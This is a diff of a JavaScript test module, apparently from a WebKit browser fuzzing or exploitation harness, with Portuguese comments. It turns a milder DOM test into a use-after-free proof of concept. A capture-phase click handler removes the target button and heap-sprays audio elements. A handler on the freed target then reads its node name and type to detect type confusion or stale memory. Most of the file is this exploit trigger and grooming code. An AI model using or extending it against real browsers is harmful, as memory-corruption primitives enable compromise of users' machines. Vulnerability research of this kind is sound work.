@@ -1,68 +1,89 @@
-import { GCOracle } from '../mod_executor.js';
 import { Groomer } from '../mod_groomer.js';
 
 export default {
-    id:       'DOM_EVENT_REMOVED_ELEMENT',
+    id:       'DOM_EVENT_PATH_UAF',
     category: 'DOM',
-    risk:     'MEDIUM',
+    risk:     'HIGH',
     description:
-        'Múltiplos tipos de eventos disparados em elemento removido do DOM. ' +
-        'MutationObserver registrado pré-remove pode disparar sobre nó freed.',
+        'UAF no EventDispatcher C++. O caminho do evento é pré-calculado. ' +
+        'Durante a fase de captura (descida), destruímos o nó alvo e forçamos o GC. ' +
+        'Quando o evento entra na fase de borbulha (subida), tenta ler o EventTarget libertado.',
 
     setup: function() {
-        this.callbackLog = [];
-        this.el = document.createElement('div');
-        this.el.tabIndex = 0;
-        this.el.style.cssText = 'width:100px;height:100px;background:#222;position:absolute;will-change:transform;';
-
-        this.el.addEventListener('focus', () => {
-            try { this.callbackLog.push({ ev: 'focus', rect: this.el.getBoundingClientRect() }); }
-            catch(e) { this.callbackLog.push({ ev: 'focus', err: e.message }); }
+        this.results = {};
+        this.sandbox = document.getElementById('groomer-sandbox');
+        
+        this.parent = document.createElement('div');
+        this.target = document.createElement('button');
+        
+        this.parent.appendChild(this.target);
+        this.sandbox.appendChild(this.parent);
+        
+        void this.parent.offsetWidth; // Constrói a RenderTree C++
+        
+        const self = this;
+        
+        // A ARMADILHA: Executa NA DESCIDA (Capture: true)
+        this.parent.addEventListener('click', function(e) {
+            // O GATILHO: Matamos o alvo antes que o evento chegue a ele!
+            self.target.remove();
+            
+            // Inundamos a memória C++ para sobrepor o EventTarget destruído
+            let trash = Groomer.sprayDOM('audio', 200);
+        }, true); // <- TRUE = Fase de Captura
+        
+        // O EXTRATOR: Executa NA SUBIDA (Bubble: false) do próprio alvo fantasma!
+        this.target.addEventListener('click', function(e) {
+            try {
+                // 'this' aqui é o EventTarget. O WebKit acha que ele está vivo.
+                // Mas ele já foi removido e a memória esburacada.
+                self.results.ghostNodeName = this.nodeName; 
+                self.results.ghostNodeType = this.nodeType;
+            } catch(err) {
+                self.results.error = err.message;
+            }
         });
-
-        this.el.addEventListener('fuzz', () => {
-            try { this.callbackLog.push({ ev: 'fuzz', offset: this.el.offsetWidth }); } 
-            catch(e) { this.callbackLog.push({ ev: 'fuzz', err: e.message }); }
-        });
-
-        document.body.appendChild(this.el);
-
-        this.mutations = [];
-        this.observer = new MutationObserver(records => {
-            records.forEach(r => {
-                try { this.mutations.push({ type: r.type, target: r.target?.nodeName }); } 
-                catch(e) { this.mutations.push({ err: e.message }); }
-            });
-        });
-        this.observer.observe(document.body, { childList: true, subtree: true });
-
-        // 🚨 Oráculo: Alvo marcado para abate
-        if (GCOracle.registry) GCOracle.registry.register(this.el, `${this.id}_target`);
     },
 
     trigger: function() {
-        this.el.remove();
-
-        // 🚨 Grooming: Prepara o terreno com buracos para causar corrupção no EventTarget
-        let nodes = Groomer.sprayDOM('span', 400);
-        Groomer.punchHoles(nodes, 2);
+        try {
+            // Disparamos o evento sincronicamente
+            let evt = new MouseEvent('click', { bubbles: true, cancelable: true });
+            this.target.dispatchEvent(evt);
+        } catch(e) {
+            this.results.error = e.message;
+        }
     },
 
     probe: [
-        s => { s.el.dispatchEvent(new Event('fuzz')); return s.callbackLog.length; },
-        s => { s.el.dispatchEvent(new FocusEvent('focus')); return s.callbackLog.length; },
-        s => s.el.getBoundingClientRect().width,
-        s => s.el.offsetWidth,
-        s => s.el.offsetParent,
-        s => s.el.isConnected,
-        s => getComputedStyle(s.el).transform,
-        s => getComputedStyle(s.el).willChange,
-        s => { try { s.el.focus(); return 'ok'; } catch(e) { return e.message; } },
-        s => s.mutations.length,
-        s => s.mutations.some(m => m.err) ? 'MUTATION_ERROR' : 'ok',
+        s => s.results.error || 'Trajetória Concluída',
+        
+        // Probe de TYPE CONFUSION (O alvo mudou de identidade?)
+        s => {
+            if (s.results.ghostNodeName) {
+                let name = s.results.ghostNodeName;
+                if (name !== 'BUTTON') {
+                    // Se o nome for indefinido ou diferente, o C++ leu lixo da RAM
+                    return `💥 TYPE CONFUSION: BUTTON virou ${name}`; 
+                }
+            }
+            return 'BUTTON Retido e Seguro';
+        },
+
+        // Probe de STALE DATA
+        s => {
+            let type = s.results.ghostNodeType;
+            if (type !== undefined && type !== 1) { // 1 = ELEMENT_NODE
+                return type; // Dispara STALE DATA no HUD
+            }
+            return 0; // Seguro
+        }
     ],
 
     cleanup: function() {
-        try { this.observer.disconnect(); } catch(e) {}
+        try { this.parent.remove(); } catch(e){}
+        this.parent = null;
+        this.target = null;
+        this.results = {};
     }
 };
